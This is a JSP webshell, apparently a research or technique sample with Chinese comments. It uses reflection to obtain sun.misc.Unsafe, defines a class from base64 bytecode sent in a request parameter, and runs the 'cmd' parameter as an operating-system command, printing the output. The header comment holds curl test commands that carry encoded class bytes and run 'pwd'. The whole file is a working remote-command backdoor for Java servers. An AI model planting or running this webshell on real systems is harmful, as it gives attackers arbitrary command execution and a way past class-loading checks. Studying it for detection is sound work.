<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="sun.misc.Unsafe" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%--
    JDK11之前使用Unsafe来定义任意的类对象并通过反射调用类方法
    测试方法: curl -i http://localhost:8080/modules/unsafe.jsp?bytes=yv66vgAAADIAHwcAAgEAHWNvbS9hbmJhaS9saW5neGUvYWdlbnQvQWJUZXN0BwAEAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgEABENvZGUKAAMACQwABQAGAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAH0xjb20vYW5iYWkvbGluZ3hlL2FnZW50L0FiVGVzdDsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAKRXhjZXB0aW9ucwcAEgEAE2phdmEvaW8vSU9FeGNlcHRpb24KABQAFgcAFQEAEWphdmEvbGFuZy9SdW50aW1lDAAXABgBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgAUABoMAA4ADwEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAAtBYlRlc3QuamF2YQAhAAEAAwAAAAAAAgABAAUABgABAAcAAAAvAAEAAQAAAAUqtwAIsQAAAAIACgAAAAYAAQAAAAUACwAAAAwAAQAAAAUADAANAAAACQAOAA8AAgAQAAAABAABABEABwAAADIAAgABAAAACLgAEyq2ABmwAAAAAgAKAAAABgABAAAACAALAAAADAABAAAACAAbABwAAAABAB0AAAACAB4%3D&cmd=pwd
    测试方法: curl -i http://localhost:8080/modules/unsafe.jsp?bytes=yv66vgAAADQAGgoABQAQCgARABIKABEAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAKRXhjZXB0aW9ucwcAFgEAClNvdXJjZUZpbGUBAAxDb21tYW5kLmphdmEMAAYABwcAFwwAGAAZDAAKAAsBABBvcmcvc3UxOC9Db21tYW5kAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsAIQAEAAUAAAAAAAIAAQAGAAcAAQAIAAAAHQABAAEAAAAFKrcAAbEAAAABAAkAAAAGAAEAAAAIAAkACgALAAIACAAAACAAAgABAAAACLgAAiq2AAOwAAAAAQAJAAAABgABAAAACwAMAAAABAABAA0AAQAOAAAAAgAP&cmd=pwd
--%>
<%
    String className = "org.su18.Command";// 定义一个不存在的类
    Class clazz = null;

    try {
        // 反射调用下,如果这个类已经被声明了就没必要再创建了
        clazz = Class.forName(className);
    } catch (ClassNotFoundException e) {
        // base64解码请求参数后获取这个类的字节码
        byte[] bytes = new BASE64Decoder().decodeBuffer(request.getParameter("bytes"));

        // 通过反射获取到Unsafe实例,因为无法直接通过Unsafe.getUnsafe()来获取实例
        Field f = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
        f.setAccessible(true);

        // 使用Unsafe.defineClass()方法来定义一个类
        clazz = ((Unsafe) f.get(null)).defineClass(className, bytes, 0, bytes.length, getClass().getClassLoader(), null);
    }

    // 上面的逻辑如果没有错误就已经成功的拿到需要创建的类对象了,所以接下来只需要调用类方法就可以了.
    // 这里调用com.anbai.lingxe.agent.AbTest.exec(cmd)方法,并输出命令执行结果
    Method m = clazz.getMethod("exec", String.class);
    m.setAccessible(true);
    Process process = (Process) m.invoke(null, request.getParameter("cmd"));
    InputStream in = process.getInputStream();
    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\A");
    out.println(s.hasNext() ? s.next() : "");
%>